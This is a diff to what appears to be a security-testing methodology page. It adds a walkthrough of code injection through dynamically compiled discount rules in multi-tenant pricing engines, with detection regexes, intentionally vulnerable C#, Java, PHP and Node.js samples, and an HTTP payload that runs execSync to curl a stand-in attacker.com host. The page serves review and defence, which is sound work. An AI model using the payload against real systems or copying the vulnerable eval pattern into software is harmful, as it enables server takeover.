@@ -1428,82 +1428,88 @@ If a connection can be established, use database functionality to execute comman
 
 ***
 
+#### Remote Code Execution via Dynamic JIT Compilation in Multi-Tenant Pricing Engines
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite
 {% endstep %}
 
 {% step %}
-
+Draw the application architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Reverse engineer the application code according to the underlying technology stack.
 {% endstep %}
 
 {% step %}
-
+Analyze the architecture of pricing engines or B2B billing systems. In these systems, administrators of each organization (Tenant) can define custom discount or tax rules (for example, "if the cart amount > 1000, apply a 10% discount").
 {% endstep %}
 
 {% step %}
-
+Identify the performance bottleneck: if the system evaluates defined rules through Abstract Syntax Tree (AST) traversal for millions of transactions per second, the server CPU becomes heavily occupied, causing latency.
 {% endstep %}
 
 {% step %}
-
+Discover the engineering optimization: to solve this problem, developers use Just-In-Time Compilation (JIT) instead of interpreting the rules. They place the user's discount logic directly into a code string and dynamically convert it into native bytecode and cache it.
 {% endstep %}
 
 {% step %}
-
+Analyze the backend code generation logic. The developer receives rule variables (such as condition and discount value) and uses string concatenation to construct the structure of an anonymous function.
 {% endstep %}
 
 {% step %}
-
+Understand the hidden architectural assumption: the developer assumes that user input in UI forms only contains numbers or simple mathematical operators, and because this data is cached before execution, there is no risk of direct script execution.
 {% endstep %}
 
 {% step %}
-
+Review the validation boundaries. If the API does not perform strict structural validation (such as Regex validation allowing only numbers) on the Condition or Formula fields, the input string is directly passed into the compiler engine (such as Roslyn, GroovyShell, or an eval function).
 {% endstep %}
 
 {% step %}
-
+Authenticate as a Tenant administrator and Create a new discount rule. In the condition field or discount formula, place a code injection payload that breaks out of the existing function structure and executes operating system commands.
 {% endstep %}
 
 {% step %}
-
+For example, if the structure is: `if ({Condition}) return {Discount};` modify the condition in a way that closes the existing `if` statement structure and places additional code execution logic after it.
 {% endstep %}
 
 {% step %}
-
+Save the rule. The system sends this string to the compiler for optimization.
 {% endstep %}
 
 {% step %}
+The compiler translates the injected code as part of the application's business logic and loads it into memory, Simulate a purchase checkout process so that the discount rule is triggered
+{% endstep %}
 
+{% step %}
+The compiled malicious bytecode is executed, resulting in Remote Code Execution (RCE) with the highest level of privileges on the server
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+CSharpScript\.EvaluateAsync<\w+>\s*\([\s\S]*\{
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+GroovyShell\s*\(\s*\)\.evaluate\s*\([\s\S]*\{
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+eval\s*\(\s*["'].*\$
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+new\s+Function\s*\([\s\S]*\$\{
 ```
 {% endtab %}
 {% endtabs %}
@@ -1513,25 +1519,25 @@ If a connection can be established, use database functionality to execute comman
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+"CSharpScript\.EvaluateAsync<\w+>\(.*\{"
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+"GroovyShell\(\)\.evaluate\(.*\{"
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+"eval\(\s*[\"'].*\\$"
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+"new\s+Function\s*\([\s\S]*\\\$\\\{"
 ```
 {% endtab %}
 {% endtabs %}
@@ -1541,24 +1547,35 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class DynamicPricingEngine 
 {
-    private readonly LdapConnection _ldapConnection;
+    private readonly ConcurrentDictionary<string, ScriptRunner<decimal>> _compiledRules = new();
 
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task<decimal> CalculateDiscountAsync(string ruleId, CartDto cart, string userCondition, string discountValue) 
     {
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
         // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var runner = _compiledRules.GetOrAdd(ruleId, id => 
+        {
+            var code = $@"
+                public decimal Calculate(CartDto cart) 
+                {{
+                    if ({userCondition}) 
+                    {{
+                        return cart.Total * {discountValue}m;
+                    }}
+                    return 0m;
+                }}
+                return Calculate(cart);";
 
-        return ExtractRolesFromLdapResponse(response);
+            // [4]
+            var options = ScriptOptions.Default.AddReferences(typeof(CartDto).Assembly);
+            return CSharpScript.Create<decimal>(code, options, globalsType: typeof(PricingGlobals)).CreateDelegate();
+        });
+
+        var globals = new PricingGlobals { cart = cart };
+        return await runner(globals);
     }
 }
 ```
@@ -1567,26 +1584,34 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class DynamicPricingEngine {
 
-    @Autowired
-    private LdapTemplate ldapTemplate;
+    private final ConcurrentHashMap<String, Script> compiledRules = new ConcurrentHashMap<>();
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
+    public BigDecimal calculateDiscount(String ruleId, CartDto cart, String userCondition, String discountValue) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
         // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
-        );
+        Script script = compiledRules.computeIfAbsent(ruleId, id -> {
+            String code = 
+                "def calculate(cart) {\n" +
+                "    if (" + userCondition + ") {\n" +
+                "        return cart.getTotal() * " + discountValue + "\n" +
+                "    }\n" +
+                "    return 0.0\n" +
+                "}\n" +
+                "return calculate(cart)";
 
-        return roles;
+            // [4]
+            GroovyShell shell = new GroovyShell();
+            return shell.parse(code);
+        });
+
+        Binding binding = new Binding();
+        binding.setVariable("cart", cart);
+        script.setBinding(binding);
+        
+        return new BigDecimal(script.run().toString());
     }
 }
 ```
@@ -1594,24 +1619,31 @@ public class SamlProvisioningService {
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class DynamicPricingEngine 
 {
-    protected $ldapConnection;
+    protected $compiledRules = [];
 
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function calculateDiscount(string $ruleId, CartDto $cart, string $userCondition, string $discountValue): float 
     {
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
         // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        if (!isset($this->compiledRules[$ruleId])) {
+            $code = "
+                return function(\$cart) {
+                    if ({$userCondition}) {
+                        return \$cart->total * {$discountValue};
+                    }
+                    return 0.0;
+                };
+            ";
+            
+            // [4]
+            $this->compiledRules[$ruleId] = eval($code);
+        }
 
-        return $this->extractRoles($entries);
+        $runner = $this->compiledRules[$ruleId];
+        return $runner($cart);
     }
 }
 ```
@@ -1619,30 +1651,30 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
-        // [1]
-        let departmentClaim = assertion.attributes['Department'];
+class DynamicPricingEngine {
+    constructor() {
+        this.compiledRules = new Map();
+    }
 
+    calculateDiscount(ruleId, cart, userCondition, discountValue) {
+        // [1]
         // [2]
         // [3]
-        // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
+        if (!this.compiledRules.has(ruleId)) {
+            let code = `
+                if (${userCondition}) {
+                    return cart.total * ${discountValue};
+                }
+                return 0;
+            `;
+            
+            // [4]
+            let runner = new Function('cart', code);
+            this.compiledRules.set(ruleId, runner);
+        }
 
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
-        return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
-            });
-        });
+        let runner = this.compiledRules.get(ruleId);
+        return runner(cart);
     }
 }
 ```
@@ -1651,244 +1683,42 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The pricing engine is designed to process a high volume of requests, and using a Logic Tree Interpreter causes a significant performance degradation, \[2] The system uses caching to store the compiled function so that the code is generated only once, \[3] The architecture completely assumes that the `userCondition` parameter only contains valid comparison operators (such as `cart.total > 1000`), \[4] The security boundary collapse occurs here. Instead of compiling secure and isolated templates, the developer directly concatenates untrusted string values with the application code and passes them to the Host Language Engine to be compiled into executable memory
 
-{% endstep %}
+```http
+// 1. Attacker (Tenant Admin) updates a pricing rule to inject arbitrary OS commands.
+// They craft the payload to break out of the "if" statement structure.
 
-{% step %}
+POST /api/v1/billing/rules HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_admin_token>
+Content-Type: application/json
 
-{% endstep %}
-{% endstepper %}
-
-***
-
-{% stepper %}
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-{% endstep %}
-
-{% step %}
-
-
-**VSCode Regex Detection**
-
-{% tabs %}
-{% tab title="C#" %}
-```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
-```
-{% endtab %}
-{% endtabs %}
-
-**RipGrep Regex Detection**
-
-{% tabs %}
-{% tab title="C#" %}
-```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
-```
-{% endtab %}
-
-{% tab title="Java" %}
-```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
-```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
-```
-{% endtab %}
-{% endtabs %}
-
-**Vulnerable Code Pattern**
-
-{% tabs %}
-{% tab title="C#" %}
-```csharp
-public class SamlProvisioningService 
 {
-    private readonly LdapConnection _ldapConnection;
-
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
-    {
-        // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
-        // [2]
-        // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
-
-        return ExtractRolesFromLdapResponse(response);
-    }
+  "ruleName": "Black Friday Promo",
+  "condition": "1==1) { require('child_process').execSync('curl http://attacker.com/`whoami`'); } if(false",
+  "discountValue": "0.20"
 }
-```
-{% endtab %}
 
-{% tab title="Java" %}
-```java
-@Service
-public class SamlProvisioningService {
+// 2. The Attacker initiates a test checkout to trigger the execution of the rule.
+POST /api/v1/checkout HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_admin_token>
+Content-Type: application/json
 
-    @Autowired
-    private LdapTemplate ldapTemplate;
-
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
-        // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
-        // [2]
-        // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
-        );
-
-        return roles;
-    }
-}
-```
-{% endtab %}
-
-{% tab title="PHP" %}
-```php
-class SamlProvisioningService 
 {
-    protected $ldapConnection;
-
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
-    {
-        // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
-        // [2]
-        // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
-
-        return $this->extractRoles($entries);
-    }
+  "cartId": "CART_991"
 }
+
+// 3. The backend evaluates the cart. The JIT compiler constructs and executes:
+// if (1==1) { require('child_process').execSync('curl http://attacker.com/`whoami`'); } if(false) { return cart.total * 0.20; }
+//
+// 4. Remote Code Execution occurs instantly on the host server.
 ```
-{% endtab %}
-
-{% tab title="Node.js" %}
-```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
-        // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
-        // [2]
-        // [3]
-        // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
-
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
-        return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
-            });
-        });
-    }
-}
-```
-{% endtab %}
-{% endtabs %}
 {% endstep %}
 
 {% step %}
-
-{% endstep %}
-
-{% step %}
-
+To support complex pricing rules while maintaining millisecond-level response times, software engineers decided to abandon rule interpretation at the database layer and leverage the host language’s dynamic code evaluation capabilities. They assumed that UI restrictions and JSON schemas were sufficient to prevent the injection of malicious logic, An attacker bypasses the user interface layer and sends a malicious string directly to the API, escaping from the conditional structure defined by the developer (for example, the `if` statement parentheses). When a custom class or function is generated in the background, the malicious string is recognized as part of the executable language instructions (such as C# or Node.js) and executes malicious code with full process-level privileges
 {% endstep %}
 {% endstepper %}
 
